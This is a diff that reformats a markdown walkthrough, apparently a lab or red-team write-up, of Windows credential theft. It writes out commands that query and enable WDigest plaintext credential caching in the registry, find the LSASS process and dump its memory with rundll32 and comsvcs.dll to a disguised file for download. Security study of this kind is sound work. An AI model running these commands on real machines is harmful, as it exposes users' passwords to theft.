@@ -40,6 +40,7 @@
    ![image](https://github.com/user-attachments/assets/8b473af9-46a4-4f89-9278-ff2b2c1b54b7)
 
    #### It Worked !!
+   
    ![wbsh](https://github.com/user-attachments/assets/4c83acaf-d287-4330-9b7c-34514170a965)
 
    ![image](https://github.com/user-attachments/assets/55a6b0e8-78cf-46d7-ae3f-91f68353e9b8)
@@ -49,38 +50,40 @@
    ![image](https://github.com/user-attachments/assets/78176ea2-9843-480b-984c-b65e5ce7de80)
 
    
-   ### 2. Next step we are enabling wdigest then dumping LSASS then downloading it
+### 2. Next step we are enabling wdigest then dumping LSASS then downloading it
 
-      a. is WDigest Enabled?
+   a. is WDigest Enabled?
 
-      ```
+      
       reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
-      ```
+      
 
-      ![image](https://github.com/user-attachments/assets/b6029281-dae5-4253-a7c5-8d4365bcc295)
+   ![image](https://github.com/user-attachments/assets/b6029281-dae5-4253-a7c5-8d4365bcc295)
 
 
-      b. Let's Enable it
+   b. Let's Enable it
 
-      ```
+      
       Set-ItemProperty -Force -Path  'HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' -Name  'UseLogonCredential' -Value '1'
-      ```
+      
+      
+   ![image](https://github.com/user-attachments/assets/ac6e01e2-ab72-4ba4-928b-4a2ead73f624)
 
-      ![image](https://github.com/user-attachments/assets/ac6e01e2-ab72-4ba4-928b-4a2ead73f624)
-
-      c. now we got a clear plain text passwords stored at LSASS
-      ```
+      
+   c. now we got a clear plain text passwords stored at LSASS
+      
       tasklist | findstr "lsass" 
-      ```
-      ![image](https://github.com/user-attachments/assets/58db05a4-2da0-4d51-8bdf-9671eb584c94)
+      
+      
+   ![image](https://github.com/user-attachments/assets/58db05a4-2da0-4d51-8bdf-9671eb584c94)
 
-      d. let's dump it
-      ```
+   d. let's dump it
+      
       C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump, 668 C:\Windows\Temp\logctl.zip full
-      ```
+      
 
-      e. download it
-      ![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)
+   e. download it
+   ![image](https://github.com/user-attachments/assets/6994c404-8d93-42f3-ae33-89e6cc34c703)
       
       
 ------
